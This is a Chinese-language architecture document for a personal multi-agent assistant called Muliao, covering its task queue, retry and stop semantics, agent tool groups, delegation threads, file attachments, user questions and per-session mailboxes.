# Muliao 架构

个人多 agent 助手。后端 Python（FastAPI + pydantic-ai），前端 React PWA（可添加到 iOS 主屏并接收 Web Push）。单机部署，SQLite + 文件目录。

## 1. 领域概念

| 概念 | 含义 | 事实存放处（唯一来源） |
|---|---|---|
| Agent | 一个助手：模型、指令、私有记忆、私有 skill、工作目录。以系统生成、不可变的 `id`（12 位十六进制）标识——主键、外键、目录名、URL、工具参数、配置引用都用它；`name` 只用于展示，可改、唯一（NFC 规范化，任意可见字符） | `agents` 表；私有资源在 `data/resources/agents/<id>/`，工作目录 `data/workspaces/<id>/` |
| Session | 某个 agent 的一段对话，由某个触发源创建 | `sessions` 表 |
| Message | pydantic-ai `ModelMessage` 原样序列化 | `messages` 表（每行一条 ModelMessage） |
| Task | 一个待执行的工作单元：`turn`（会话的一次运行）、`compaction`（上下文压缩）、`reflection`（强制反思）、`deliver`（投递通知） | `tasks` 表 |
| Compaction | session 早期消息的摘要，之后发给模型的上下文用它代替 `through_message_id` 及之前的消息 | `compactions` 表 |
| Skill | `SKILL.md`（YAML frontmatter: name, description + 正文）。公共 skill 与 agent 私有 skill | `resources/public/skills/<name>/`、`resources/agents/<id>/skills/<name>/` |
| Prompt | agent 自己的指令，或合并进所有 agent 的公共 prompt | `resources/agents/<id>/PROMPT.md`、`resources/public/PROMPT.md` |
| Memory | agent 私有记忆，一份有长度上限的 markdown | `resources/agents/<id>/MEMORY.md` |
| MCP server | agent 私有或公共的 MCP 连接配置，可引用 vault | `resources/{public,agents/<id>}/mcp/<name>.json` |
| Secret | 加密保存的密码/token，通过 key 引用；公共或 agent 私有 | `secrets` 表（Fernet 加密） |
| File | 对话里出现的文件：用户随消息发送的图片与附件、agent 用 `share_file` 发出的文件。写入后不可变，按 id 引用，引用形式唯一（`/api/files/<id>/<名称>`）；与消息相互独立，删除会话不删文件 | `files` 表（元数据）；内容按 sha256 存在 `data/files/` |
| Mail | 投进某个会话信箱、交给它的 agent 的一封信件：用户消息（含附件）、对提问的回答、触发器与委派来的任务、后台任务与 thread 的事件。按到达顺序排列，记下用户是否在等它的回答、结果交回哪个会话（委派）、状态（排队 / 已处理 / 被丢弃）与处理它的那次运行 | `mail` 表 |
| Notification | 发给用户的一条通知：标题、正文、指向的会话（系统通知如前置检查告警没有）、是否未读。通知页列出它们，未读数就是导航与应用图标的角标；Web Push 是它的投递方式，deliver task 只引用它，内容不另存一份 | `notifications` 表 |
| Trigger | 具名、持久的事件来源，把外部刺激变成投进某个会话信箱的一封信件；触发方式（定时、webhook……）多态实现 | `triggers` 表 |

目录：

```
data/
  muliao.db
  vapid_private.pem            # Web Push 密钥，首次启动生成
  files/<sha前两位>/<sha256>   # 对话里的文件内容（元数据在 files 表），相同内容只存一份
  files/tmp/                   # 上传中的临时文件，启动时清空
  resources/                   # git 仓库：agent 能改的文本资源，每次修改提交一版（见 muliao.resources）
    public/
      PROMPT.md                # 公共 prompt（合并进所有 agent）
      skills/<name>/SKILL.md   # 公共 skill
      mcp/<name>.json          # 公共 MCP server
    agents/<id>/
      PROMPT.md                # agent 的指令
      MEMORY.md                # 私有记忆
      skills/<name>/SKILL.md   # 私有 skill（同名时遮蔽公共 skill）
      mcp/<name>.json          # 私有 MCP server（同名时遮蔽公共的）
  workspaces/<id>/             # 文件工具与 shell 的工作目录（不做版本管理）
  tmp/                         # 临时 agent 的工作目录，用完即删
```

**资源的版本管理**：agent 能改的文本资源都存成文件，用一个 git 仓库（`data/resources/`）管理版本：每次修改提交一次，作者是 `user` 或做出修改的 agent 的 id；历史与回滚都来自 git（回滚 = 把旧版本内容写回并作为新的一次提交）。版本管理只管布局里的资源文件（`resources.RESOURCE_FILES`，唯一定义：各级 `PROMPT.md`、agent 的 `MEMORY.md`、`skills/<name>/SKILL.md`、`mcp/<name>.json`）。仓库也会被绕过工具写入：agent 有 shell 与文件工具，能直接改这些文件；进程在写入中途被杀也会留下写完未提交的变化。两者用同一个机制收敛：每次写入之前（先于读取当前内容）、以及启动时，把资源文件上的这类变化先单独提交为一次 reconcile（作者记为系统，含义是「来源不明的外部写入」），所以外部写入最迟在下一次任何资源写入时进入历史，也不会被并进下一个作者的提交。布局之外的东西（agent 放进 skill 目录的脚本、虚拟环境、嵌套仓库、临时文件）不进历史：历史只增不改，进去就删不掉，也不能让一个目录里的杂物让所有资源写入失败。工具说明要求 agent 只用工具改这些资源，局部修改用 `edit_skill`，不必整篇重写。secret 不在这里——它们加密存在数据库的 vault 里，不需要版本管理。

用最终正确性换简化：文件与 git 不在数据库事务里，不追求两者的强一致。
- 换掉的：跨数据库与文件的分布式事务（例如删除 agent 时数据库行与资源目录同时成功）。
- 失败可见：每次写入（`ResourceRepo.update`）的读取—变换—写入—提交都在同一把锁里，任何一步失败都把涉及的路径在文件系统上还原成写入前的样子（写入前先保存旧内容，不依赖 git——失败的往往正是 git，比如锁被别的进程占用）并向上报错，所以「报错」等于「没有生效」，调用方可以放心重试；还原本身失败时记 error 并与原错误一起抛出，不声称已回滚，留下的修改由下次启动的 recover 提交；启动时把数据库里已删除、仓库里还留着目录的 agent 记为 warning。
- 可收敛：只有进程在写入中途被杀会留下不一致，由启动时（worker 开始之前）的 `ResourceRepo.recover` 统一收敛：删除 `.git` 下遗留的锁与半写的 `*.tmp`，把写完未提交的变化提交为一次 `reconcile`（作者记为系统，日志记录涉及的路径）。
- 代价可控：不一致只发生在进程被杀的那一刻，窗口持续到下次启动；孤儿目录只占空间、出现在 MCP 管理列表里，由人清理。仓库不受部署机全局 git 配置的 hook 与签名影响。

## 2. 核心数据流：一切都是 Task

我们在 pydantic-ai 消息上加的约定（工具结果 metadata 的键、停止标记、合成的工具结果、「调用是否已有结果」的定义）都登记在 `muliao.conventions` 的模块说明里，解析也只在那里写一份；新增约定先在那里登记。

所有触发源只做一件事：**创建 session（或选中已有 session），在同一事务里往它的信箱投一封信件**（`conversation.receive` → `mailbox.post_in`）。消费信箱的运行是一条 `turn` task，之后的执行、重试、反思、通知全部由同一个任务队列驱动。唯一的例外是 `ask_agent`：它在发问方那一步里直接驱动私有 thread 的运行（见第 4 节）。

```
Web / 触发器（定时、webhook……）/ delegate_task        后台任务、thread 交回、运行中检查
          │  conversation.receive(Inbound)（唯一入口）            │
          ▼                                                        ▼
       mail（会话信箱，mailbox.post_in）──── wake_in：需要时投递一次运行
          │
 tasks(turn) ──► Worker ──► RunHandler ──┐
                                          ├─► Consumer ──► pydantic-ai agent.iter（逐步驱动）
 ask_agent（在发问方那一步里内联）────────┘      │ 每一步一个事务：
                                                 ├─ 请求模型之前：这次请求 + 它带上的信件（记为已处理）
                                                 └─ 模型回复之后：这条回复
                                                 │ 运行结束（与 task 记为完成同一事务）：
                                                 ├─ session.unread / updated_at
                                                 ├─ agent.turns_since_reflection += 1，达到阈值 → tasks(reflection)
                                                 ├─ 处理过的信件有用户在等 → notifications + tasks(deliver)
                                                 ├─ 委派来的信件 → 结果交回发起方的信箱
                                                 └─ 信箱里还有信件 → 下一次运行
                                                                     │
                              ReflectionHandler ◄────────────────────┘     DeliverHandler ──► Web Push
```

- **Lane（串行通道）**：每个 task 带 `lane`。同一 lane 内严格 FIFO、同一时刻最多一个 running；不同 lane 并发。运行与 compaction 的 lane 是 `session:<id>`，reflection 的 lane 是 `reflection:<agent id>`，deliver 的 lane 是 `deliver:<session>`，私有 thread 的内联运行记在 `inline:<session>`（worker 不领取，见第 4 节）。
- **TaskHandler 接口**：每种 kind 一个实现，worker 只负责领取、调用、按结果记账，不关心 kind 的细节。每个 task 有总时限（`task_timeout_seconds`），超时按暂时性失败重试。
- **事务**：SQLite 只有一个写者，`Database.transaction()` 在进程内用锁串行化所有事务，换来无丢失更新、无 `SQLITE_BUSY`；代价是事务内不得做模型调用、网络 IO 等慢操作。嵌套开事务会立即报错。
- **删除约束**：session 或 agent 有正在运行的 task 时拒绝删除（409），避免运行结果无处提交。
- **实时展示**：运行中的事件（回答与思考的增量、工具调用/结果）经进程内 EventBus 推到前端 SSE；数据库是唯一事实源，事件流只是展示加速。每一步保存后历史里就有了这一步，所以内存里只留当前这一段的事件（`bus.LiveRuns`：一段从一次请求保存之后开始，包括模型的回复与它调用的工具，带这一段的 `run_id` 与递增的 `seq`），会话接口作为 `live` 给出，中途打开页面从这一段的开头看起；回复在执行工具之前就已保存，会话接口不在历史里重复显示这一段已经在展示的消息（`after_message_id`）。每保存一次请求就换一段并发 `saved` 事件，前端重新拉取历史；前端把快照与之后经 SSE 收到的事件按 `run_id` 与 seq 合并，丢掉别的段，发现缺口（快照先于订阅生成）就再拉取一次。运行结束（完成、失败、停止）时丢弃缓存。

### 用最终正确性换架构简化

换掉的：「每个触发点、每次模型调用、每次推送都必须当场成功」。

换来的：所有触发源、反思、通知共用一套「持久化 task + 重试 + 启动恢复」语义，没有各自的补偿逻辑。

三条判据：

1. **失败可见**：task 失败记录 `error`、打 error 日志，UI 的「任务」页可查并可手动重试；session 页显示最近一次运行失败；重试运行期间保留上一次的错误。
2. **可收敛**：契约内的失败（模型接口 408/409/425/429/5xx/529、底层为连接错误的 `ModelAPIError`、网络错误、超时、推送服务 5xx/429）按指数退避重试，上限 `task_max_attempts`；进程崩溃后启动时把 `running` 复位为 `pending` 重新执行。运行**每一步保存**（这次请求与它带上的信件同一个事务、回复一个事务），收尾（计数、推送、后续 task）与 task 记为完成同一个事务，所以重试从上一步续跑：历史停在一条没得到回复的请求上就重发它，停在带工具调用的回复上就执行这些调用（pydantic-ai 的续跑语义），已经保存的步骤不会重放，也不会产生重复消息。
3. **代价可控**：续跑只会重复执行中断那一步里的工具副作用（如 shell 命令）——仅在崩溃、超时或执行工具中途失败时发生，个人助手可接受；`web` 工具按次计费，那一步里已做过的搜索与抓取会再付一次费（抓取按目标域名限流时，重放也可能再次撞上限流，直到用完重试次数）。临时 agent 会放大这一点：它整个在调用方的一步里运行，一步里可能并行多条模型调用链，任何一条的暂时性失败都会取消其余并让这一步重做（含各临时 agent 的 shell 与 MCP 副作用）。为此临时 agent 有请求数上限（`runtime.temp_agent_request_limit`），做不完的任务在上限处失败并交回调用方拆分，而不是靠总时限反复重试；剩余的重放代价仍按个人助手可接受。Web Push 逐个订阅投递，只有 404/410（RFC 8030 的订阅失效）才删除订阅，其他 4xx 视为本端问题让 task 失败、不删数据；只有暂时性失败才整体重试，可能对已成功的设备重复推送，可接受。

契约外的失败（代码 bug、模型返回 400、请求超限、响应解码失败、配置错误）不重试，task 直接 `failed` 并告警。

后台循环（worker、定时触发）意外退出视为 bug，进程直接退出交给进程管理器重启。单个定时触发器的数据不合法时只停用它并记录 `last_error`，不影响其他触发器。

### 停止会话

用户可以停止会话（`POST /api/sessions/{id}/stop`，界面上运行中显示停止按钮）。停止就是消费停止、信箱清空，连带停下它发起的异步工作。做法同 ChatGPT、Claude Code：停止前已经产生的部分照常保存，因为工具的副作用（shell、写文件）已经发生，之后的模型必须知道做过什么，否则会重复执行。

- **只取消模型运行**：`runtime/stopping.py` 的 `StoppableRuns` 把运行放在单独的子任务里，停止只取消它；worker 的任务没有被取消，所以与关停、总时限（它们取消外层任务，已保存的步骤留着、由队列恢复或重试续跑）区分开。
- **补齐已产生的部分**：每一步本来就保存了，运行中被停止时只需保存当前这一步还没保存的部分：消费者从 pydantic-ai 运行中的历史（`ctx.state.message_history`，逐步驱动时直接拿到）取出它们，还没出结果的工具调用补上「被用户停止、可能已部分执行」的结果（用 `conventions.unanswered_calls` 判断），最后一条标上 `TURN_STOPPED`，展示为「已停止」。正在生成的那段回答由 pydantic-ai 以 `state='interrupted'` 留在运行历史里，一起保存（之后也会发给模型）；其中参数还没生成完的工具调用同样补上结果，参数在落库前脱敏，截断到无法解析的 `vault_set` 参数整体替换。未核实：被打断的思考块（没有签名）发给 Anthropic 等提供方会不会被拒，遇到时那次运行失败可见。
- **其余部分在一处完成**（`Consumer._halt`，运行中与没在运行时共用，停止是会话状态的迁移，不依赖有没有协程在跑）：
  - 先结束会话的后台任务（同 `job_kill`；结局照常由监督者记下，但不再投信）。
  - 让库里的历史停在不会被续跑的地方：悬空的工具调用补上「被停止」的结果，末尾没得到回复的请求标上 `TURN_STOPPED`。运行中被停止时上一步已经做了；停在运行拿到运行中的历史之前（组装指令、连接 MCP 期间）、或停在等重试的运行上时，靠这一步。
  - 排队与等重试的运行记为完成，不再执行。
  - 清空信箱：还没交给模型的信件记为被丢弃（不删除，界面上划掉显示，之后再有信件交给模型就不再显示）；之后新到的信件照常唤醒消费者。
  - 被丢弃的、以及被了结的运行处理过的委派信件交回「被停止」（见「异步 agent 回报」）。
  - 它 `report_back` 委派出去、还没交回结果的 thread 一起停止（逐层）。先撤掉这些委派的交回地址再停，被停下的工作不再给这个会话投信——否则刚清空的信箱又会唤醒它。
- **私有 thread**：`ask_agent` 的内联运行属于发问方那一步，不能单独停止（409）；发问方被停止时内联运行随之取消，按关停语义处理（内联运行记为失败），发问方这次 `ask_agent` 调用拿到「被停止、可能已部分执行」的结果。
- 被停止的运行照常收尾（task 为 done、计入反思），不推送，它处理过的委派信件把「被停止」交回发起方。

## 3. Agent 运行时

一次运行的组装（`runtime/consumer.py` 驱动，`runtime/runner.py` 组装上下文与工具）：

- **原则：给模型看的是名称和描述，给程序用的是 id。** 工具参数、返回值、instructions 里只出现 agent 名称；名称唯一，由工具层（`AgentService.find_by_name`）解析为 id，写错时把可用名称列表作为错误交还模型。id 只会作为文件路径的一部分（`agents/<id>/…`）出现在工作目录里。`tests/test_flow.py::test_model_sees_agent_names_never_ids` 守住这条规则。
- **instructions** = 公共 prompt + agent 自身指令 + 运行上下文（agent 名、工作目录、当前时间、session 来源）+ memory 全文 + skill 索引（名称、描述、作用域）+ 自我进化守则。
- **toolsets**（每个领域一个模块，在 `runtime/tools/` 下）。对话里开放哪些由 agent 的 `tool_groups` 决定（`runtime.runner.ToolGroups`，名称在组合根 `TOOL_GROUPS` 唯一声明）：`workspace`、`temp_agent`、`delegation`、`notify`、`agents`、`public_skills`（写公共 skill）、`mcp`（使用 MCP server）、`mcp_admin`（管理 MCP）、`vault`、`triggers`、`web`（只在配置了 `[web]` 时存在）；私有 skill、memory 与自己的指令（自我改进）总是开放，读公共 skill 也总是可以；向用户提问（`ask_user`，见第 4 节）也总是开放，但只在用户等着这次运行的回答时出现。反思只开放自我改进，以及该 agent 本来就有的 `public_skills`。新建 agent 默认全部开放；处理不可信输入（外部事件、网页内容）的 agent 应只开放需要的组，限制提示注入能造成的后果。临时 agent 有固定的工具集（文件与 shell，加上调用方可见的 MCP 与配置了的网页搜索，不看调用方是否选了 `mcp`；`temp_agent` 本来就等同于全部权限），不受 `tool_groups` 影响：
  - 局部修改（`update_agent`、`trigger_update`）由领域服务在一个事务里读取并只改给出的字段，工具层不读后整体写回：同一响应里并行的多个修改、以及用户在界面上的同时修改互不覆盖。面向模型的错误信息只带名称，不带 id。
  - `workspace`：`read_file` / `write_file` / `edit_file` / `list_files` / `share_file`（把文件发给用户，见第 4 节「附件与文件」）/ `run_shell`（cwd = 工作目录，最小环境变量，可按 key 注入 secret，输出中的 secret 明文被替换为 `[secret:KEY]`；`background: true` 时作为后台任务运行，见第 4 节「后台任务」）/ `job_status` / `job_kill`（只在有会话的运行里出现）。不做强隔离——按需求为单人本机使用。
  - `skills`：`read_skill`（私有或公共）/ `write_skill` / `edit_skill`（改正文的一部分，规则同指令：替换恰好出现一次的片段，或追加）/ `delete_skill`（只限私有）；写公共 skill 在 `public_skills` 组：`write_public_skill` / `edit_public_skill` / `delete_public_skill`。
  - `memory`：`memory_append` / `memory_replace`，超长时 `ModelRetry` 要求先精简。
  - `instructions`：`instructions_replace`（改自己的指令：替换恰好出现一次的片段，或追加），每次修改记一版、作者是自己。
  - `agents`：`get_agent` / `create_agent` / `update_agent`（只改给出的字段，可以改自己）/ `delete_agent`（不能删除自己） / `get_public_prompt` / `set_public_prompt`。指令与公共 prompt 的修改都留版本，作者记为做出修改的 agent，用户可回滚。
  - `delegation`：`list_agents`（返回 name、description）/ `delegate_task` / `ask_agent` / `list_threads` / `stop_thread`（停止一个 thread：结束它正在进行的运行、清空它的信箱）（按名称指定目标 agent、按 thread 名指定子会话，见第 4 节）。
  - `notify`：`notify_user`（显式 Web Push）。
  - `temp_agent`：`run_temp_agent(task, instructions?, model?)`：一次性的临时 agent，在调用方那一步里同步运行（同一响应中的多次调用并行），返回它的最终回答。它只有文件与 shell 工具（工作目录在 `data/tmp/` 下临时创建、结束即删除）和调用方的 MCP，secret 按调用方的视角解析；没有记忆、skill、会话、反思与委派，也不能再开临时 agent。适合抓取网页并总结、分析文件这类做完即丢的事；需要长期积累的专长应 `create_agent` 后委派。临时 agent 不是沙箱：它和调用方有相同的 shell 权限、secret 与 MCP，工具说明里也这样告诉模型。模型请求数超过 `runtime.temp_agent_request_limit` 时以可纠正的错误交回调用方；其他失败（如模型 API 错误）向上传播，按调用方那次运行的失败统一处理（暂时性失败重试，从那一步续跑）。工作目录在 finally 里删除；删除失败或进程中途被杀时留到下次启动，由启动时清空 `data/tmp`（只归临时 agent 使用）统一收敛，删除失败记 error 日志、不改变运行结果。启动时删不掉的目录（例如脱离进程组的后台进程还在写）同样记 error 日志后跳过，不阻止服务启动：残留目录只占空间，不影响正确性。
  - `mcp_admin`：`mcp_list`（含已停用的）/ `mcp_add`（写入前实际连接并列出工具，连接失败直接把错误还给 agent）/ `mcp_set_enabled` / `mcp_remove`。改动从下一次运行起生效。
  - `vault`：`vault_list` / `vault_set` / `vault_delete`（scope = `private` | `public`，默认私有）。没有读取明文的工具；`vault_set` 的 value 参数在消息落库和推送到前端前被替换为 `[redacted]`（`runtime/redaction.py`）。
  - `triggers`：`trigger_kinds` / `trigger_list` / `trigger_create(name, kind, prompt, config, agent?)` / `trigger_update` / `trigger_run` / `trigger_delete`，一组工具覆盖所有触发方式，差异只在 `kind` 与 `config`。agent 同样按名称指定。webhook 的 token 只能由用户在界面上生成，agent 拿不到也不需要。
  - `web`：`web_search(query, count)` / `web_fetch(url)`，经 `muliao.web.WebProvider` 完成；具体服务由配置 `[web]` 的 `type` 选择（现有 `deepseek`，即 DeepSeek 的 Search / Fetch API），新增一种服务 = 一个实现加一个 `type`。query 长度、条数上限、URL 规则以服务端校验为准，不在本地重复：服务端拒绝（400/403/404/413）作为可纠正的错误交还模型；限流、超时、5xx 是暂时性失败，按运行失败统一重试；key 无效、余额不足等配置问题让运行失败。抓取的正文按 `runtime.tool_output_max_chars` 截断。没配置 `[web]` 时没有这个组，已有 agent 仍选着它会让启动失败并列出这些 agent。
  - 该 agent 可见的 MCP server（公共 + 私有），以 `<server名>_` 为工具前缀；配置中的 `${vault:KEY}` 在运行时按 server 归属者的视角解析（公共 server 只能引用公共 secret），引用不可见的 key 直接报错。
- **model**：agent 的 `model` 字段格式为 `<provider 名>:<模型名>`，provider 在配置文件 `[llm.providers.<名>]` 中定义（类型、api_key、base_url）。`llm.ModelRegistry` 是唯一按配置构造模型的地方，每个 provider 复用一个客户端。API key 与 base_url 只来自配置：base_url 未填时显式传入该类型的官方地址，不让 SDK 回退到 `*_BASE_URL` 环境变量。SDK 仍可能读取少数无法通过参数关闭的环境变量（如 `OPENAI_ORG_ID`、自定义请求头），launchd 服务只设置 `PATH`，不会带入这些变量。界面上选模型时，provider 下拉框来自配置（`GET /api/providers`），模型名由 `ModelRegistry.list_models` 向该 provider 实时查询（`GET /api/providers/{name}/models`，即各家的 models 接口），不维护本地模型清单；查询失败返回 502 并带上原因，不用猜测的列表兜底。

## 4. 会话领域：thread 与结果路由

agent 之间的委派有两种形态，都是「往某个 thread 的信箱投一封信」：

| 工具 | 父 agent | 子 session | 处理它的运行的回答 |
|---|---|---|---|
| `delegate_task(agent, task, thread)` | 立即继续，不等 | 公开 thread：进收件箱，用户可追问 | 推送给用户；父 agent 拿不到 |
| `delegate_task(..., report_back=true)` | 立即继续，不等 | 同上 | 不直接推送，作为事件交回父会话（见下文「异步 agent 回报」） |
| `ask_agent(agent, message, thread)` | 等它答完 | 私有 thread：不进收件箱，用户只读 | 作为工具结果交回父 agent |

**界面上 thread 显示在开出或续写它的那次调用处**：两个工具都把 thread 的会话 id 挂在工具结果的 metadata 上（`conventions.TOOL_THREADS`，与 `TOOL_ATTACHMENTS` 同一约定，不发给模型、随消息持久化、实时事件里也带），父会话页把 thread 显示在那次调用的过程组下方，而不是统一列在会话末尾（那会让早先的 thread 看起来属于最新的对话）。没有任何条目引用的 thread 列在末尾「未关联到调用的 thread」：在这个约定之前开出的、开出后调用被用户停止的（停止补上的结果不带 thread）、开出后调用失败的（交还模型重试的结果不带 thread）。不为后两种补记 metadata，那会把这个约定散到停止与重试的路径里。历史里引用的 thread 不在会话的 thread 列表中，说明它已被删除，显示为「thread 已删除」。

- **thread**：父 session 内对子 session 的具名引用（`sessions.parent_session_id` + `thread`，同一父 session 内唯一）。模型只用 thread 名，不接触 session id。同名即续聊，对方的上下文保留（例如审查 → 修改 → 再审查）。thread 的 agent 与种类在创建时确定：私有 thread 只能用 `ask_agent` 续聊，公开 thread 只能用 `delegate_task`。
- **推送按信件、不按 session**：每封信件带「用户是否在等它的回答」（`awaited`，由投信的入口设置，见第 8 节）。一次运行处理过的信件里有用户在等的，就把它的回答推送给用户；否则不推，agent 可以自己 `notify_user`。同一个公开 thread 里，父 agent 委派的任务与用户的追问都推送；`report_back` 的委派不推送，结果交回父 agent。这次运行开放哪些工具（`ask_user`）、指令里写的回答去向（`RunScope.reply_to`）在运行开始时按同一个事实定下：处理过的和信箱里排着的信件有用户在等就是 `user`，私有 thread 的内联运行是 `agent`，否则 `none`。运行中途才到的、用户在等的消息会被这次运行处理、收尾时推送，但这次运行的工具与指令不随之改变（工具集在 pydantic-ai 运行开始时固定）；提问要等下一次运行。
- **`delegate_task` 走信箱**：往公开 thread 的信箱投一封信，与用户消息一样由它的消费者按到达顺序处理。
- **`ask_agent` 在发问方那一步里直接驱动**（`Consumer.run_inline`）：往私有 thread 的信箱投信，在库里记一条 running 的运行（lane `inline:<会话>`，worker 不领取），用与队列里的运行同一个消费者跑完（逐步保存、收尾），拿它的回答作为工具结果。私有 thread 不由 `wake_in` 唤醒（用户不能插话，它也只收发问方的问题），「一次运行结束、信箱里还有信件就再跑一次」这条规则由 `run_inline` 自己执行，直到信箱空（例如上一次内联运行失败、这次先续跑它保存的请求，新问题在下一次运行交给模型）。同一 thread 的并行 ask 由进程内的锁串行。同一响应里对不同 thread 的多次 ask 并行执行；嵌套 ask（子 agent 再 ask）在同一调用链里依次完成。
- **用最终正确性换简化**：内联运行不做持久化挂起。换掉的是「等待期间不占 worker、进程重启后从等待处继续」；换来的是没有等待表、挂起与恢复逻辑，队列里的运行与 ask_agent 共用同一个消费者。三条判据：失败可见——子 agent 的运行失败时如实记为失败，并作为发问方那次运行的失败抛出（暂时性失败重试，其余进入 failed 可人工重试）；进程重启时还记为 running 的内联运行由队列恢复记为失败（不交给 worker，否则同一个 thread 会有两个消费者）；可收敛——发问方续跑时重新执行那次 `ask_agent`，向子 thread 再投一封同样的问题，子 agent 看得到之前保存的步骤；代价可控——等待期间占用发问方的 worker 槽位和任务总时限，嵌套越深越耗时；重做时子 thread 会多一次同样的提问，子 agent 的工具副作用可能重复，反思计数会多计。个人助手可接受。
- **删除**：删除父 session 会一并删除它的私有 thread（逐层）；用户可见的 thread 保留（`parent_session_id` 置空）。有任务正在运行时拒绝删除；内联运行在库里记为 running，所以私有 thread 正被发问时同样拒绝删除它或它的 agent，不需要再看它的祖先会话。

### 附件与文件

做法同主流 IM 的媒体仓库（Matrix media repository、Slack files）：先上传得到 id，消息里只放引用。

- **上传**：`POST /api/files?name=<名称>`，请求体就是文件内容，`Content-Type` 是它的类型（同 Matrix `/media/upload`，不用 multipart），边读边写边算 sha256，超过 `runtime.upload_max_bytes`（默认 50MB）立即停止。名称必须是单个路径段，不合法直接拒绝，不做修正。发消息时 `attachments` 带上 id（可以只有附件没有文字），`conversation.receive` 校验它们存在，记在消息信件上。
- **在消息里的两种形态**（`runtime/attachments.py`）：存储形态是 `UserPromptPart` 里的 `ImageUrl` / `DocumentUrl`，url 即文件引用，数据库、界面、重放都用它；每次模型请求前由 pydantic-ai 的 `before_model_request` 钩子（`AttachmentsForModel`）展开成模型形态：一段说明（名称、类型、大小、工作目录里的路径），可内联的图片（png/jpeg/gif/webp）再附上内容。展开只替换这一次请求的消息列表，持久化的历史不变，所以文件内容在数据库里没有副本。模型不支持图片时，provider 的报错让运行失败，不悄悄丢掉图片。
- **交给工具**：信件交给模型时把附件复制到 agent 工作目录的 `uploads/<id>/<名称>`（重试时覆盖成原件），供文件工具与 shell 处理；这是派生副本，原件只在文件存储里。
- **agent 发出文件**：`share_file(path)` 把工作目录里的文件存一份快照，通过 `ToolReturn.metadata`（`conventions.TOOL_ATTACHMENTS`）挂到这次工具结果上。metadata 不发给模型、随消息持久化，所以文件一定显示给用户（图片内联、其他为下载链接，显示在过程组外），不依赖模型在回答里转写引用；模型只收到一句「已发给用户」。任何工具都可以用同一约定挂文件。临时 agent 与 `ask_agent` 的被问 agent 挂上的文件，随调用方那次工具调用的结果一起交给用户（`runtime/answers.py`），出现在用户正在看的会话里；临时 agent 超过请求数上限时，这次已共享的文件不交付，由调用方拆分后重做时重新共享。
- **一致性**：内容先写临时文件再改名到最终位置，之后才插入元数据行；失败即上传失败，没有 id 就没有引用。中途被杀留下的临时文件由启动时 `FileStore.recover` 清掉；有内容没元数据的孤儿只占空间，访问不到，同样内容再上传时复用。

### 向用户提问（ask_user）

做法同 Claude Code 的 AskUserQuestion、Codex 的提问：一次 1 到 4 个选择题（单选或多选，每题 2 到 6 个选项），界面上每题总能在「其他」里自己写。只在用户等着这次运行的回答（`reply_to = user`）时提供，由工具的 `prepare` 隐藏：`ask_agent` 的私有 thread、触发器、反思与临时 agent 里没有人会回答（`runtime/tools/ask_user.py`）。

- **运行停在提问上，不在 worker 里等人**：工具抛出 pydantic-ai 的 `CallDeferred`，这次运行正常结束（调用暂时没有结果），并通知用户「等你回答：…」。会话里还在等回答的提问由历史推导（没有结果的 `ask_user` 调用，`runtime.questions.pending_questions`；「调用是否已有结果」只在 `conventions.unanswered_calls` 定义一处，参数被拒绝、交还模型重试的调用也算有结果），不另存状态。提问只在运行结束时挂起，之后的运行都会先关闭它们，所以挂起的提问只可能在历史末尾。
- **回答是一封信件**：界面把回答随消息提交（`answers: {tool_call_id: [每题的回答]}`，可以没有文字），`conversation.receive` 校验它针对还在等回答、也还没有回答在信箱里排着的提问（`conversation.answerable_questions`，接口的 `pending_questions` 是同一条规则），选项属于该题、单选至多一个、每题都有选择或「其他」，然后把交给模型的结果（`AskResult`：`answered` 加每题的选择，或没回答时的说明）存在回答信件里。消费者开始一次运行时把它作为 `DeferredToolResults` 交回，模型看到的就是这次调用的结果，信箱里排着的其他信件接在后面；界面也从这份结构化结果展示已回答的提问。回答交给模型之前一直排着（运行失败重试时也还在），所以不需要别的条件。
- **等回答时**：会话停在提问上时，只有回答或用户的新消息能唤醒消费者；事件（检查、完成通知）留在信箱里，等它们一起交给模型（`mailbox.wake_in`，与消费者开头的判断同一条规则）。
- **不回答、直接发消息**：pydantic-ai 拒绝在未处理的调用后追加新消息，所以把所有没回答的提问显式记为「用户没回答、发了新消息」（同一次提交里回答了别的提问时记为跳过），结果随那一步保存，提问不再显示为待回答。
- **迟到的回答**：回答投信之后、交给模型之前，提问可能已被另一次运行关闭（用户先发了消息、那次运行已经带着「没回答」继续）。这时回答作为一段用户消息交给模型（`questions.late_answer_text`），不丢、也不让运行卡住。
- **展示**：提问不收进过程组。待回答的显示为表单；已回答的显示问题与选择；已提交、还没交给模型的回答显示在信箱里；参数被工具 schema 拒绝的调用（模型写错了，已作为可纠正的错误交还）按普通工具错误展示。

### 会话信箱（`runtime/mailbox.py`、`runtime/consumer.py`）

每个会话是一个**信箱**加一个**消费者**。一切要交给 agent 的东西都是往信箱里投一封信件：用户消息（含附件）、对提问的回答、触发器与委派来的任务、后台任务的完成与检查、thread 交回的结果，按到达顺序排列。消费者把信件喂给模型：信箱里有信件就开始一次**运行**（一条 turn task，payload 为空，输入都在信箱里），把排着的信件交给模型；每次请求模型之前，把这期间新到的信件接在工具结果后面一起交给模型（同 Claude Code：两次工具调用之间就能处理，不等这次运行结束）；模型不再调用工具时这次运行结束，信箱里还有信件就接着跑下一次。异步工具（后台 shell、`delegate_task(report_back)`）发起后立即返回，完成与运行中检查都只是往发起方的信箱里投信。

- **信件交给模型的样子**：消息是原文加附件引用；事件是用户消息内容里独立的一段（`conventions.format_event`，`<event source="job:12">…</event>`），那条请求的 metadata 记下是第几段（`TURN_EVENTS`，构造内容时就记下，不从文字反推），界面据此把事件单独显示；一次请求里的信件都并进同一段用户消息。
- **每一步保存**：一步 = 一次模型请求及其返回的工具调用。请求模型之前，这次请求与它带上的信件（记为已处理，`consumed_by` 是这次运行）在同一个事务里提交；模型回复之后提交这条回复。失败或进程重启后从上一步续跑（见第 2 节）。pydantic-ai 在运行开始时会规整传入的历史（合并相邻的请求、补齐悬空调用的结果，从请求续跑时取出末尾那条准备重发），条数可能和库里不同，所以「已保存到哪」的基准在规整之后取（`StepHooks.started`），之后历史只在末尾追加。
- **从哪里开始**：历史停在提问上时不是续跑，哪怕末尾是一条请求——提问与别的工具在同一个回复里时，pydantic-ai 以挂起结束时把别的工具的结果追加成一条请求，这时等回答（或跳过）作为 `DeferredToolResults` 交回，pydantic-ai 把已有结果的调用跳过。否则历史停在没得到回复、没标停止的请求上就重发它，停在带工具调用的回复上就执行这些调用。
